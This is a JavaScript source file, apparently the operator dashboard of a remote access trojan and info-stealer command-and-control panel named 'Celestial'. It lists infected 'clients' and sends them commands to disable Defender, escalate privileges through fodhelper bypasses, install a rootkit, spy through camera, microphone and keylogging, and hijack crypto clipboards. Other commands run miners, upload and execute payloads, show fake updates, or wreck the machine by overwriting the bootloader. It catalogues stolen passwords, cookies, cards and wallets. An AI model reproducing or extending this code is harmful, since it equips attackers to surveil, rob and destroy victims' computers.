const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;
let currentView = 'clients';
let currentLang = localStorage.getItem('celestial.lang') || 'en';
let currentTheme = localStorage.getItem('celestial.theme') || 'light';
const notifications = [];
const caches = { recovery: [], wallets: [], proxy: [], webinjection: [], sorter: [], autotasks: [], filestore: [], checkersessions: [] };

const $ = (id) => document.getElementById(id);
const el = (tag, props = {}, children = []) => {
  const n = document.createElement(tag);
  Object.assign(n, props);
  children.forEach(c => n.appendChild(typeof c === 'string' ? document.createTextNode(c) : c));
  return n;
};
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const svg = (path) => {
  const s = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  s.setAttribute('viewBox', '0 0 24 24');
  s.setAttribute('fill', 'none');
  s.setAttribute('stroke', 'currentColor');
  s.setAttribute('stroke-width', '1.8');
  s.innerHTML = path;
  return s;
};

/* ============ i18n ============ */
const I18N = {
  en: {
    signin: 'Sign in', operatorKey: 'Operator Key', signIn: 'Sign In',
    needAccess: 'Need access?', contactAdmin: 'Contact admin',
    home: 'Home', dashboard: 'Dashboard', clients: 'Clients', recovery: 'Recovery',
    wallets: 'Wallets', proxy: 'Proxy', clipper: 'Clipper', webinjection: 'Web Injection',
    sorter: 'Sorter', autotasks: 'Auto Tasks', filestore: 'File Store', miner: 'Miner',
    checker: 'Checker', checkersessions: 'Checker Sessions', builder: 'Builder',
    notifications: 'Notifications', theme: 'Theme', logout: 'Logout', profile: 'Profile',
    all: 'All', columns: 'Columns', clearAll: 'Clear all',
    baseThemes: 'Base', gradientThemes: 'Nitro Gradients', language: 'Language',
    connectedClients: 'Connected Clients', recoveryLogs: 'Recovery Logs', walletLogs: 'Wallet Logs',
    clientBuilder: 'Client Builder', autoTasksTitle: 'Auto Tasks',
    search: 'Search...', noClients: 'No clients connected.', noData: 'No data.',
    refresh: 'Refresh', addLog: 'Add Log', addWallet: 'Add Wallet', addProxy: 'Add Proxy',
    addRule: 'Add Rule', addGroup: 'Add Group', addTask: 'Add Task', addJob: 'Add Job',
    addSession: 'Add Session', upload: 'Upload', buildClient: 'Build Client', save: 'Save',
    cancel: 'Cancel', entries: 'entries', totalLogs: 'Total Logs', cookies: 'Cookies',
    passwords: 'Passwords', cards: 'Cards', applications: 'Applications',
    atomic: 'Atomic', exodus: 'Exodus', phantom: 'Phantom', metamask: 'MetaMask', trustWallet: 'Trust Wallet',
    onlineProxies: 'Online Proxies', offlineProxies: 'Offline Proxies', totalProxies: 'Total Proxies',
    workers: 'Workers', totalFiles: 'Total Files', totalSize: 'Total Size', recent: 'Recent (7D)',
    activeMiners: 'Active Miners', totalHashrate: 'Total Hashrate', cpuHashrate: 'CPU Hashrate',
    gpuHashrate: 'GPU Hashrate', accepted: 'Accepted', rejected: 'Rejected', totalRuntime: 'Total Runtime',
    totalTasks: 'Total Tasks', active: 'Active', onceTasks: 'Once Tasks', executions: 'Executions',
    selectClient: 'Select a client first', sent: 'Sent', added: 'Added',
    invalidKey: 'Invalid key', backend: 'Connected', disconnected: 'Disconnected',
    general: 'General', options: 'Options', install: 'Install', final: 'Final',
    clientTag: 'Client Tag', note: 'Note', mutex: 'Mutex',
    defenderExclusion: 'Defender Exclusion', forceAdmin: 'Force Admin', debug: 'Debug',
    enabled: 'Enabled', location: 'Location', folder: 'Folder', filename: 'Filename',
    recentBuilds: 'Recent builds', buildCreated: 'Build created', serverOk: 'Server',
    welcome: 'Welcome', newClient: 'New client connected',
    notifEmpty: 'No notifications yet.'
  },
  ru: {
    signin: 'Вход', operatorKey: 'Ключ оператора', signIn: 'Войти',
    needAccess: 'Нет доступа?', contactAdmin: 'Связаться с админом',
    home: 'Главная', dashboard: 'Панель', clients: 'Клиенты', recovery: 'Восстановление',
    wallets: 'Кошельки', proxy: 'Прокси', clipper: 'Клиппер', webinjection: 'Web-инъекции',
    sorter: 'Сортировщик', autotasks: 'Автозадачи', filestore: 'Хранилище', miner: 'Майнер',
    checker: 'Чекер', checkersessions: 'Сессии чекера', builder: 'Сборщик',
    notifications: 'Уведомления', theme: 'Тема', logout: 'Выход', profile: 'Профиль',
    all: 'Все', columns: 'Столбцы', clearAll: 'Очистить всё',
    baseThemes: 'Базовые', gradientThemes: 'Градиенты Nitro', language: 'Язык',
    connectedClients: 'Подключённые клиенты', recoveryLogs: 'Журнал восстановления', walletLogs: 'Журнал кошельков',
    clientBuilder: 'Сборщик клиента', autoTasksTitle: 'Автозадачи',
    search: 'Поиск...', noClients: 'Нет подключённых клиентов.', noData: 'Нет данных.',
    refresh: 'Обновить', addLog: 'Добавить', addWallet: 'Добавить', addProxy: 'Добавить',
    addRule: 'Добавить правило', addGroup: 'Добавить группу', addTask: 'Добавить задачу', addJob: 'Добавить задание',
    addSession: 'Добавить сессию', upload: 'Загрузить', buildClient: 'Собрать клиент', save: 'Сохранить',
    cancel: 'Отмена', entries: 'записей', totalLogs: 'Всего', cookies: 'Куки',
    passwords: 'Пароли', cards: 'Карты', applications: 'Приложения',
    atomic: 'Atomic', exodus: 'Exodus', phantom: 'Phantom', metamask: 'MetaMask', trustWallet: 'Trust Wallet',
    onlineProxies: 'Онлайн', offlineProxies: 'Офлайн', totalProxies: 'Всего прокси',
    workers: 'Воркеры', totalFiles: 'Всего файлов', totalSize: 'Общий размер', recent: 'За 7 дней',
    activeMiners: 'Активные', totalHashrate: 'Хешрейт', cpuHashrate: 'Хешрейт CPU',
    gpuHashrate: 'Хешрейт GPU', accepted: 'Принято', rejected: 'Отклонено', totalRuntime: 'Время работы',
    totalTasks: 'Всего задач', active: 'Активные', onceTasks: 'Одноразовые', executions: 'Запусков',
    selectClient: 'Сначала выберите клиента', sent: 'Отправлено', added: 'Добавлено',
    invalidKey: 'Неверный ключ', backend: 'Подключено', disconnected: 'Отключено',
    general: 'Общие', options: 'Опции', install: 'Установка', final: 'Финал',
    clientTag: 'Тег клиента', note: 'Заметка', mutex: 'Мутекс',
    defenderExclusion: 'Исключение Defender', forceAdmin: 'Форсировать админа', debug: 'Отладка',
    enabled: 'Включено', location: 'Расположение', folder: 'Папка', filename: 'Имя файла',
    recentBuilds: 'Последние сборки', buildCreated: 'Сборка создана', serverOk: 'Сервер',
    welcome: 'Добро пожаловать', newClient: 'Подключён новый клиент',
    notifEmpty: 'Уведомлений пока нет.'
  },
  zh: {
    signin: '登录', operatorKey: '操作员密钥', signIn: '登录',
    needAccess: '没有访问权限？', contactAdmin: '联系管理员',
    home: '主页', dashboard: '仪表盘', clients: '客户端', recovery: '恢复',
    wallets: '钱包', proxy: '代理', clipper: '剪贴板', webinjection: '网页注入',
    sorter: '分类器', autotasks: '自动任务', filestore: '文件存储', miner: '挖矿',
    checker: '检查器', checkersessions: '检查会话', builder: '构建器',
    notifications: '通知', theme: '主题', logout: '退出', profile: '资料',
    all: '全部', columns: '列', clearAll: '清空全部',
    baseThemes: '基础', gradientThemes: 'Nitro 渐变', language: '语言',
    connectedClients: '已连接客户端', recoveryLogs: '恢复日志', walletLogs: '钱包日志',
    clientBuilder: '客户端构建器', autoTasksTitle: '自动任务',
    search: '搜索...', noClients: '无客户端连接。', noData: '无数据。',
    refresh: '刷新', addLog: '添加日志', addWallet: '添加钱包', addProxy: '添加代理',
    addRule: '添加规则', addGroup: '添加分组', addTask: '添加任务', addJob: '添加作业',
    addSession: '添加会话', upload: '上传', buildClient: '构建客户端', save: '保存',
    cancel: '取消', entries: '条', totalLogs: '总日志', cookies: 'Cookie',
    passwords: '密码', cards: '卡片', applications: '应用',
    atomic: 'Atomic', exodus: 'Exodus', phantom: 'Phantom', metamask: 'MetaMask', trustWallet: 'Trust Wallet',
    onlineProxies: '在线代理', offlineProxies: '离线代理', totalProxies: '总代理',
    workers: '工作线程', totalFiles: '文件总数', totalSize: '总大小', recent: '最近7天',
    activeMiners: '活跃矿机', totalHashrate: '总算力', cpuHashrate: 'CPU 算力',
    gpuHashrate: 'GPU 算力', accepted: '已接受', rejected: '已拒绝', totalRuntime: '总运行',
    totalTasks: '任务总数', active: '活跃', onceTasks: '一次性', executions: '执行次数',
    selectClient: '请先选择客户端', sent: '已发送', added: '已添加',
    invalidKey: '密钥无效', backend: '已连接', disconnected: '已断开',
    general: '通用', options: '选项', install: '安装', final: '最终',
    clientTag: '客户端标签', note: '备注', mutex: '互斥锁',
    defenderExclusion: 'Defender 排除', forceAdmin: '强制管理员', debug: '调试',
    enabled: '启用', location: '位置', folder: '文件夹', filename: '文件名',
    recentBuilds: '最近构建', buildCreated: '构建已创建', serverOk: '服务器',
    welcome: '欢迎', newClient: '新客户端已连接',
    notifEmpty: '暂无通知。'
  }
};

function t(key) { return (I18N[currentLang] && I18N[currentLang][key]) || (I18N.en[key]) || key; }

function applyLang(code) {
  currentLang = code;
  localStorage.setItem('celestial.lang', code);
  document.documentElement.lang = code;
  document.querySelectorAll('[data-i18n]').forEach(node => {
    node.textContent = t(node.dataset.i18n);
  });
  document.querySelectorAll('#loginLangs button, #themeLangs button').forEach(b => {
    b.classList.toggle('active', b.dataset.lang === code);
  });
  if (currentView) loadView(currentView);
}

/* ============ Theme manager ============ */
const THEMES = [
  { id: 'light',    label: 'Light',    preview: 'linear-gradient(135deg,#ffffff,#f3f4f6)' },
  { id: 'dark',     label: 'Dark',     preview: 'linear-gradient(135deg,#1a1d21,#2b3038)' },
  { id: 'midnight', label: 'Midnight', preview: 'linear-gradient(135deg,#0f172a,#38bdf8)' },
  { id: 'nord',     label: 'Nord',     preview: 'linear-gradient(135deg,#2e3440,#88c0d0)' },
  { id: 'nitro-aurora', label: 'Aurora',  preview: 'linear-gradient(135deg,#667eea,#764ba2,#22d3ee)' },
  { id: 'nitro-sunset', label: 'Sunset',  preview: 'linear-gradient(135deg,#fa709a,#fee140,#ff6b6b)' },
  { id: 'nitro-ocean',  label: 'Ocean',   preview: 'linear-gradient(135deg,#2193b0,#6dd5ed,#1e3c72)' },
  { id: 'nitro-forest', label: 'Forest',  preview: 'linear-gradient(135deg,#11998e,#38ef7d,#085078)' },
  { id: 'nitro-rose',   label: 'Rose',    preview: 'linear-gradient(135deg,#ee9ca7,#c471ed,#f64f59)' },
  { id: 'nitro-cyber',  label: 'Cyber',   preview: 'linear-gradient(135deg,#ff00cc,#333399,#00f0ff)' },
  { id: 'nitro-candy',  label: 'Candy',   preview: 'linear-gradient(135deg,#a18cd1,#fbc2eb,#ffecd2)' },
  { id: 'nitro-flame',  label: 'Flame',   preview: 'linear-gradient(135deg,#f12711,#f5af19,#f12711)' },
  { id: 'nitro-mono',   label: 'Mono',    preview: 'linear-gradient(135deg,#232526,#5c5f61,#414345)' }
];

function applyTheme(id) {
  currentTheme = id;
  localStorage.setItem('celestial.theme', id);
  document.body.setAttribute('data-theme', id);
  document.querySelectorAll('.theme-swatch').forEach(s => {
    s.classList.toggle('active', s.dataset.theme === id);
  });
}

function renderThemePanel() {
  const base = $('themeBase');
  const grad = $('themeGradients');
  base.innerHTML = '';
  grad.innerHTML = '';
  THEMES.forEach(th => {
    const sw = el('div', { className: 'theme-swatch' });
    sw.dataset.theme = th.id;
    sw.style.background = th.preview;
    sw.style.backgroundSize = '200% 200%';
    sw.appendChild(el('div', { className: 'ts-check' }, ['✓']));
    sw.appendChild(el('div', { className: 'ts-label' }, [th.label]));
    sw.onclick = () => applyTheme(th.id);
    if (th.id.startsWith('nitro-')) grad.appendChild(sw);
    else base.appendChild(sw);
  });
  applyTheme(currentTheme);
}

/* ============ Notifications ============ */
function addNotification(title, msg, type = 'info') {
  const n = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), title, msg, type, time: new Date() };
  notifications.unshift(n);
  if (notifications.length > 100) notifications.pop();
  renderNotifications();
  toast(`${title}: ${msg}`, 3000);
}

function renderNotifications() {
  const list = $('notifList');
  const badge = $('notifBadge');
  if (!notifications.length) {
    list.innerHTML = '';
    list.appendChild(el('div', { className: 'notif-empty' }, [t('notifEmpty')]));
    badge.classList.add('hidden');
    return;
  }
  badge.textContent = notifications.length;
  badge.classList.remove('hidden');
  list.innerHTML = '';
  notifications.forEach(n => {
    const item = el('div', { className: 'notif-item' });
    item.appendChild(el('div', { className: 'ni-dot' }));
    const body = el('div', { className: 'ni-body' });
    body.appendChild(el('div', { className: 'ni-title' }, [n.title]));
    body.appendChild(el('div', { className: 'ni-msg' }, [n.msg]));
    body.appendChild(el('div', { className: 'ni-time' }, [n.time.toLocaleTimeString()]));
    item.appendChild(body);
    list.appendChild(item);
  });
}

function toast(msg, ms = 2500) {
  const tt = $('toast');
  tt.textContent = msg;
  tt.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => tt.classList.add('hidden'), ms);
}

/* ============ Side panels ============ */
function toggleNotifPanel() {
  const p = $('notifPanel');
  const o = $('themePanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}
function toggleThemePanel() {
  const p = $('themePanel');
  const o = $('notifPanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}

/* ============ Modal ============ */
function openModal(title, bodyNodes) {
  $('modalTitle').textContent = title;
  const body = $('modalBody');
  body.innerHTML = '';
  bodyNodes.forEach(n => body.appendChild(n));
  $('modal').classList.remove('hidden');
}
function closeModal() { $('modal').classList.add('hidden'); hideCtx(); }

/* ============ Context menu ============ */
function hideCtx() { $('ctxmenu').classList.add('hidden'); }

function showCtxMenu(e, items) {
  const m = $('ctxmenu');
  m.innerHTML = '';
  const build = (parent, list) => {
    list.forEach(it => {
      if (it.sep) { parent.appendChild(el('div', { className: 'ctx-sep' })); return; }
      const row = el('div', { className: 'ctx-item' + (it.sub ? ' has-sub' : '') });
      if (it.icon) row.appendChild(svg(it.icon));
      row.appendChild(document.createTextNode(it.label));
      if (it.sub) {
        row.appendChild(el('span', { className: 'arrow' }, ['›']));
        const sub = el('div', { className: 'ctx-sub' });
        build(sub, it.sub);
        row.appendChild(sub);
      } else if (it.action) {
        row.onclick = (ev) => { ev.stopPropagation(); it.action(); hideCtx(); };
      }
      parent.appendChild(row);
    });
  };
  build(m, items);
  m.classList.remove('hidden');
  const x = Math.min(e.clientX, window.innerWidth - 260);
  const y = Math.min(e.clientY, window.innerHeight - m.offsetHeight - 20);
  m.style.left = x + 'px';
  m.style.top = y + 'px';
}

/* ============ Auth ============ */
$('loginBtn').onclick = () => {
  const key = $('keyInput').value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};
$('keyInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('loginBtn').click(); });

socket.on('operator:ready', () => {
  $('login').classList.add('hidden');
  $('app').classList.remove('hidden');
  $('statusIndicator').className = 'status status-online';
  $('statusIndicator').title = t('backend');
  addNotification(t('serverOk'), t('welcome'), 'info');
  loadView('clients');
});
socket.on('operator:error', (msg) => { $('loginError').textContent = t('invalidKey'); });
$('logoutBtn').onclick = () => location.reload();

function api(path, opts = {}) {
  return fetch(path, {
    ...opts,
    headers: { 'content-type': 'application/json', 'x-operator-key': operatorKey, ...(opts.headers || {}) }
  }).then(r => r.json());
}

/* ============ Nav ============ */
document.querySelectorAll('#nav button').forEach(btn => {
  btn.onclick = () => loadView(btn.dataset.view);
});

function setActiveNav(view) {
  document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
}

const TITLES = {
  home: 'home', dashboard: 'dashboard', clients: 'connectedClients', recovery: 'recoveryLogs',
  wallets: 'walletLogs', proxy: 'proxy', clipper: 'clipper', webinjection: 'webinjection',
  sorter: 'sorter', autotasks: 'autoTasksTitle', filestore: 'filestore', miner: 'miner',
  checker: 'checker', checkersessions: 'checkersessions', builder: 'clientBuilder'
};

function loadView(view) {
  currentView = view;
  setActiveNav(view);
  const root = $('viewRoot');
  root.innerHTML = '';
  $('viewTitle').textContent = t(TITLES[view] || view);
  const fn = views[view];
  if (fn) fn(root);
  else root.appendChild(el('div', { className: 'empty' }, ['Not implemented.']));
}

/* ============ Helpers ============ */
function searchBar(placeholder, onInput) {
  const bar = el('div', { className: 'searchbar' });
  bar.appendChild(svg('<circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/>'));
  const inp = el('input', { placeholder: placeholder || t('search') });
  inp.oninput = () => onInput(inp.value.toLowerCase());
  bar.appendChild(inp);
  return { bar, inp };
}

function statCard(label, value, pill) {
  const s = el('div', { className: 'stat' });
  if (pill !== undefined) s.appendChild(el('div', { className: 'stat-pill' }, [String(pill)]));
  s.appendChild(el('div', { className: 'stat-label' }, [label]));
  s.appendChild(el('div', { className: 'stat-value' }, [String(value)]));
  return s;
}

function dataTable(columns, rows, opts = {}) {
  const wrap = el('div', { className: 'table-wrap' });
  const tb = el('table');
  const thead = el('thead');
  const trh = el('tr');
  if (opts.checkbox) {
    const th = el('th', { className: 'td-check' });
    th.appendChild(el('input', { type: 'checkbox' }));
    trh.appendChild(th);
  }
  columns.forEach(col => {
    const th = el('th');
    const inner = el('span', { className: 'th-inner' });
    inner.appendChild(document.createTextNode(col.label));
    const sortIco = el('span', { className: 'sort-ico' });
    sortIco.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
    inner.appendChild(sortIco);
    th.appendChild(inner);
    trh.appendChild(th);
  });
  thead.appendChild(trh);
  tb.appendChild(thead);
  const tbody = el('tbody');
  if (!rows.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: columns.length + (opts.checkbox ? 1 : 0) });
    td.appendChild(el('div', { className: 'empty' }, [opts.emptyText || t('noData')]));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    rows.forEach(row => {
      const tr = el('tr');
      if (opts.checkbox) {
        const td = el('td', { className: 'td-check' });
        td.appendChild(el('input', { type: 'checkbox' }));
        tr.appendChild(td);
      }
      columns.forEach(col => {
        const td = el('td');
        if (col.render) td.innerHTML = col.render(row);
        else td.textContent = row[col.key] ?? '';
        tr.appendChild(td);
      });
      if (opts.onContext) tr.oncontextmenu = (e) => { e.preventDefault(); showCtxMenu(e, opts.onContext(row)); };
      tbody.appendChild(tr);
    });
  }
  tb.appendChild(tbody);
  wrap.appendChild(tb);
  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, ['1 of ' + Math.max(1, rows.length) + ' row(s) selected']));
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, ['Rows per page']));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('span', {}, ['Page 1 of 1']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);
  return wrap;
}

/* ============ Clients ============ */
socket.on('clients', (list) => {
  const prev = clients.length;
  clients = list;
  $('pillCount').textContent = `${list.length} | 0 | ${list.length}`;
  if (list.length > prev) addNotification(t('clients'), t('newClient'), 'info');
  if (currentView === 'clients') renderClients();
});

function renderClients() {
  const root = $('viewRoot');
  root.innerHTML = '';
  const search = searchBar('Search clients...', (q) => {
    document.querySelectorAll('.client-row').forEach(r => {
      r.style.display = r.dataset.host.toLowerCase().includes(q) ? '' : 'none';
    });
  });
  root.appendChild(search.bar);

  const wrap = el('div', { className: 'table-wrap' });
  const t2 = el('table');
  const thead = el('thead');
  const trh = el('tr');
  const cols = ['', 'Status', 'First Seen', 'IP', 'Tag', 'Note', 'Username', 'Machine Name', 'Active Window', 'Anti-Virus', 'OS'];
  cols.forEach(c => {
    const th = el('th');
    if (c) {
      const inner = el('span', { className: 'th-inner' });
      inner.appendChild(document.createTextNode(c));
      const s = el('span', { className: 'sort-ico' });
      s.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
      inner.appendChild(s);
      th.appendChild(inner);
    } else th.appendChild(el('input', { type: 'checkbox' }));
    trh.appendChild(th);
  });
  thead.appendChild(trh);
  t2.appendChild(thead);
  const tbody = el('tbody');
  if (!clients.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: cols.length });
    td.appendChild(el('div', { className: 'empty' }, [t('noClients')]));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    clients.forEach(c => {
      const tr = el('tr', { className: 'client-row' });
      tr.dataset.host = (c.hostname || '').toLowerCase();
      tr.appendChild(el('td', { className: 'td-check' }, [el('input', { type: 'checkbox' })]));
      const statusTd = el('td');
      const bar = el('div', { style: 'display:inline-flex;align-items:flex-end;gap:2px;height:12px' });
      [3,6,9,5].forEach(h => bar.appendChild(el('span', { style: `width:3px;height:${h}px;background:var(--ok);border-radius:1px` })));
      statusTd.appendChild(bar);
      tr.appendChild(statusTd);
      tr.appendChild(el('td', {}, [c.firstSeen || 'Sep 12, 11:58 PM']));
      tr.appendChild(el('td', {}, [c.ip || '—']));
      tr.appendChild(el('td', {}, [c.tag || 'Guest']));
      tr.appendChild(el('td', {}, [c.note || '—']));
      tr.appendChild(el('td', {}, [c.user || '—']));
      tr.appendChild(el('td', {}, [c.hostname || '—']));
      tr.appendChild(el('td', {}, [c.activeWindow || '—']));
      tr.appendChild(el('td', {}, ['N/A']));
      tr.appendChild(el('td', {}, [c.os || 'Windows']));
      tr.onclick = (e) => { if (e.target.tagName === 'INPUT') return; openClientMenu(e, c); };
      tbody.appendChild(tr);
    });
  }
  t2.appendChild(tbody);
  wrap.appendChild(t2);
  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, [`${clients.length ? 1 : 0} of ${clients.length} row(s) selected`]));
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, ['Rows per page']));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('span', {}, ['Page 1 of 1']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);
  root.appendChild(wrap);
  if (selectedClientId) {
    root.innerHTML = '';
    renderControl(root);
  }
}

function openClientMenu(e, c) {
  const sub = (label, items) => ({ label, sub: items });
  const item = (label, action, icon) => ({ label, action, icon });
  const menu = [
    sub('Client', [
      item('Elevate Privileges', () => sendCmdTo(c.id, 'elevate')),
      item('Disable Defender', () => sendCmdTo(c.id, 'disable_defender')),
      item('Rootkit', () => sendCmdTo(c.id, 'rootkit')),
      item('Reset Survival', () => sendCmdTo(c.id, 'reset_survival')),
      item('Note', () => sendCmdTo(c.id, 'note')),
      item('Update', () => sendCmdTo(c.id, 'update')),
      sub('Change Bridge', [
        item('ComputerDefaults', () => sendCmdTo(c.id, 'bridge_computerdefaults')),
        item('Fodhelper', () => sendCmdTo(c.id, 'bridge_fodhelper'))
      ]),
      item('Disconnect', () => sendCmdTo(c.id, 'disconnect')),
      item('Restart', () => sendCmdTo(c.id, 'restart')),
      { sep: true },
      item('Uninstall', () => sendCmdTo(c.id, 'uninstall')),
      item('Kill', () => sendCmdTo(c.id, 'kill'))
    ]),
    sub('User Interaction', [
      item('MessageBox', () => sendCmdTo(c.id, 'ui_msgbox')),
      item('TTS', () => sendCmdTo(c.id, 'ui_tts')),
      item('Notepad', () => sendCmdTo(c.id, 'ui_notepad')),
      item('Open Link', () => sendCmdTo(c.id, 'ui_open_link')),
      item('Remote Chat', () => sendCmdTo(c.id, 'ui_chat'))
    ]),
    sub('Management', [
      item('Clipboard Manager', () => sendCmdTo(c.id, 'mgmt_clipboard')),
      item('Edit Hosts', () => sendCmdTo(c.id, 'mgmt_hosts')),
      item('File Manager', () => sendCmdTo(c.id, 'mgmt_file')),
      item('Firewall Manager', () => sendCmdTo(c.id, 'mgmt_firewall')),
      item('Installed Programs', () => sendCmdTo(c.id, 'mgmt_programs')),
      item('Network Manager', () => sendCmdTo(c.id, 'mgmt_network')),
      item('Policy Manager', () => sendCmdTo(c.id, 'mgmt_policy')),
      item('Proxy', () => sendCmdTo(c.id, 'mgmt_proxy')),
      item('Registry Editor', () => sendCmdTo(c.id, 'mgmt_registry')),
      item('Service Manager', () => sendCmdTo(c.id, 'mgmt_service')),
      item('Startup Manager', () => sendCmdTo(c.id, 'mgmt_startup')),
      item('Task Manager', () => sendCmdTo(c.id, 'mgmt_task')),
      item('Task Scheduler', () => sendCmdTo(c.id, 'mgmt_scheduler')),
      item('Window Manager', () => sendCmdTo(c.id, 'mgmt_window'))
    ]),
    sub('Surveillance', [
      item('Remote Desktop', () => sendCmdTo(c.id, 'remote_desktop')),
      item('Remote Camera', () => sendCmdTo(c.id, 'remote_camera')),
      item('Remote Microphone', () => sendCmdTo(c.id, 'remote_mic')),
      item('Remote Audio', () => sendCmdTo(c.id, 'remote_audio')),
      item('Keyboard', () => sendCmdTo(c.id, 'keyboard')),
      item('Remote Shell', () => sendCmdTo(c.id, 'remote_shell')),
      item('Hidden Desktop', () => sendCmdTo(c.id, 'hidden_desktop')),
      item('Hidden Display', () => sendCmdTo(c.id, 'hidden_display')),
      item('Recovery', () => sendCmdTo(c.id, 'recovery')),
      item('Cryptocurrency Injection', () => sendCmdTo(c.id, 'crypto_inject'))
    ]),
    sub('Miscellaneous', [
      sub('Upload and Execute', [
        item('From Disk', () => sendCmdTo(c.id, 'upload_disk')),
        item('From File Store', () => sendCmdTo(c.id, 'upload_filestore')),
        item('From Link', () => sendCmdTo(c.id, 'upload_link'))
      ]),
      item('Change Desktop Wallpaper', () => sendCmdTo(c.id, 'wallpaper')),
      item('Privacy Screen', () => sendCmdTo(c.id, 'privacy_screen')),
      item('Scripting', () => sendCmdTo(c.id, 'scripting'))
    ]),
    sub('System', [
      item('Information', () => sendCmdTo(c.id, 'sys_info')),
      sub('Power', [
        item('Off', () => sendCmdTo(c.id, 'power_off')),
        item('Restart', () => sendCmdTo(c.id, 'power_restart'))
      ]),
      sub('Remove System', [
        item('Corrupt Registry', () => sendCmdTo(c.id, 'remove_registry')),
        item('Overwrite Bootloader', () => sendCmdTo(c.id, 'remove_bootloader'))
      ])
    ]),
    { sep: true },
    sub('Clipper', [item('Start', () => sendCmdTo(c.id, 'clipper_start'))]),
    sub('Web Injection', [item('Start', () => sendCmdTo(c.id, 'webinject_start'))]),
    sub('Miner', [item('Start', () => sendCmdTo(c.id, 'miner_start'))]),
    sub('Plugin System', [item('Clear All Plugins', () => sendCmdTo(c.id, 'plugins_clear'))])
  ];
  showCtxMenu(e, menu);
}

function sendCmdTo(id, action, extra = {}) {
  socket.emit('operator:cmd', { targetId: id, cmd: { action, ...extra } });
  toast(t('sent') + ': ' + action);
  addNotification('Command', action, 'info');
}
function sendCmd(action, extra = {}) {
  if (!selectedClientId) return toast(t('selectClient'));
  sendCmdTo(selectedClientId, action, extra);
}

function renderControl(root) {
  const c = clients.find(x => x.id === selectedClientId);
  const header = el('div', { className: 'toolbar' });
  const back = el('button', { className: 'btn' }, ['← Back']);
  back.onclick = () => { selectedClientId = null; loadView('clients'); };
  header.appendChild(back);
  header.appendChild(el('span', { style: 'color:var(--text-dim);font-size:0.85rem' }, [
    (c?.hostname || selectedClientId) + ' — ' + (c?.ip || '')
  ]));
  root.appendChild(header);
  const panel = el('div', { className: 'control-panel' });
  panel.appendChild(el('div', { className: 'screen-container' }, [el('img', { id: 'screen', src: '', alt: 'Remote Screen' })]));
  const side = el('div', { className: 'control-side' });
  [
    ['Screenshot','screenshot'],['Remote Desktop','remote_desktop'],
    ['Hidden Desktop','hidden_desktop'],['Visible Desktop','visible_desktop'],
    ['Remote Camera','remote_camera'],['Remote Mic','remote_mic'],
    ['Keyboard','keyboard'],['Remote Shell','remote_shell'],
    ['Show Fake Update','show_overlay'],['Hide Fake Update','hide_overlay'],
    ['File Manager','file_manager'],['Crypto Injection','crypto_inject']
  ].forEach(([label, action]) => {
    const b = el('button', {}, [label]);
    b.onclick = () => sendCmd(action);
    side.appendChild(b);
  });
  panel.appendChild(side);
  root.appendChild(panel);
}

socket.on('frame', ({ id, data }) => {
  if (id !== selectedClientId) return;
  const img = document.getElementById('screen');
  if (img) img.src = 'data:image/jpeg;base64,' + data;
});

/* ============ Collections ============ */
const collectionRerender = {};

async function loadCollection(view) {
  try {
    const data = await api('/api/' + view);
    caches[view] = data;
    if (collectionRerender[view]) collectionRerender[view]();
  } catch { toast('Load failed'); }
}

function collectionView(view, root, columns, opts = {}) {
  const render = () => {
    root.innerHTML = '';
    const c = caches[view] || [];
    if (opts.stats) {
      const row = el('div', { className: 'stat-row' });
      opts.stats(c).forEach(s => row.appendChild(statCard(s.label, s.value, s.pill)));
      root.appendChild(row);
    }
    const search = searchBar(opts.searchPlaceholder || t('search'), () => {});
    root.appendChild(search.bar);
    const bar = el('div', { className: 'toolbar' });
    if (opts.addLabel) {
      const add = el('button', { className: 'btn primary' }, [opts.addLabel]);
      add.onclick = () => opts.onAdd?.();
      bar.appendChild(add);
    }
    const refresh = el('button', { className: 'btn' }, [t('refresh')]);
    refresh.onclick = () => loadCollection(view);
    bar.appendChild(refresh);
    bar.appendChild(el('div', { className: 'spacer' }));
    bar.appendChild(el('span', { style: 'color:var(--text-mute);font-size:0.8rem' }, [c.length + ' ' + t('entries')]));
    root.appendChild(bar);
    root.appendChild(dataTable(columns, c, {
      checkbox: true,
      emptyText: opts.emptyText || t('noData'),
      onContext: (row) => [{ label: 'Delete', action: async () => { await api('/api/' + view + '/' + row.id, { method: 'DELETE' }); loadCollection(view); } }]
    }));
  };
  render();
  collectionRerender[view] = render;
}

function addRowModal(view, fields, title) {
  const nodes = fields.map(f => {
